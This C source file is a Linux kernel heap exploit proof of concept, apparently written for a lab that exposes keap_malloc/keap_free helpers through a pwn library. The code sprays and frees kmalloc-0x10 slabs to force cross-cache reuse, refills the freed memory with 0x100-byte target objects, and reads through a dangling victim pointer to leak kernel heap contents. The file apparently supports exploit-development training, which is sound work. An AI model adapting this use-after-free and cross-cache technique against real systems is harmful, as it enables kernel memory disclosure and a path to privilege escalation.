#include "libs/pwn.h"


/*******************************
 * EXPLOIT                     *
 *******************************/

#define CC_OVERFLOW_FACTOR 5 

#define VICTIM_SIZE 0x10
#define OBJS_PER_SLAB 256        // Fetch this from /sys/kernel/slab/kmalloc-VICTIM_SIZE/objs_per_slab
#define CPU_PARTIAL 120          // Fetch this from /sys/kernel/slab/kmalloc-VICTIM_SIZE/cpu_partial
#define VICTIM_CHUNKS (OBJS_PER_SLAB*(CPU_PARTIAL+1)*CC_OVERFLOW_FACTOR)

#define TARGET_SIZE 0x100
#define TARGET_CHUNKS 0x1000

int main(int argc, char* argv[]) {

  char *buf = cyclic(TARGET_SIZE);

  int leaks = 0;
  char leak[VICTIM_SIZE];
  bzero(leak, sizeof(leak));

  void *victim_chunks[VICTIM_CHUNKS];
  void *target_chunks[TARGET_CHUNKS];

  void *victim_ptr;

  pin_cpu(0, 0);
  
  puts("[+] init");
  init();

  puts("[*] fill old victim slabs");
  // fill at least on slab
  for(int i = 0; i < VICTIM_CHUNKS; ++i) {
    victim_chunks[i] = keap_malloc(VICTIM_SIZE, GFP_KERNEL_ACCOUNT);
    if (i == (VICTIM_CHUNKS / 8)*7)
        victim_ptr = victim_chunks[i];
  }
  
  // free slab in order to get cross cache
  puts("[*] free victim slabs");
  for(int i = 0; i < VICTIM_CHUNKS; ++i) {
    keap_free(victim_chunks[i]);
  }

  puts("[*] fill target slabs");
  for(int i = 0; i < TARGET_CHUNKS; ++i) {
    target_chunks[i] = keap_malloc(TARGET_SIZE, GFP_KERNEL);
    keap_write(target_chunks[i], buf, TARGET_SIZE);
  }

  puts("[*] uaf and cross-cache leak");
  // UAF in victim ptr leak
  keap_read(leak, victim_ptr, VICTIM_SIZE-1); 
  puts(leak);

  for(int i = 0; i < TARGET_CHUNKS; ++i) {
    keap_free(target_chunks[i]);
  }

  free(buf);

  return leaks > 0 ? 0 : 1;  
}
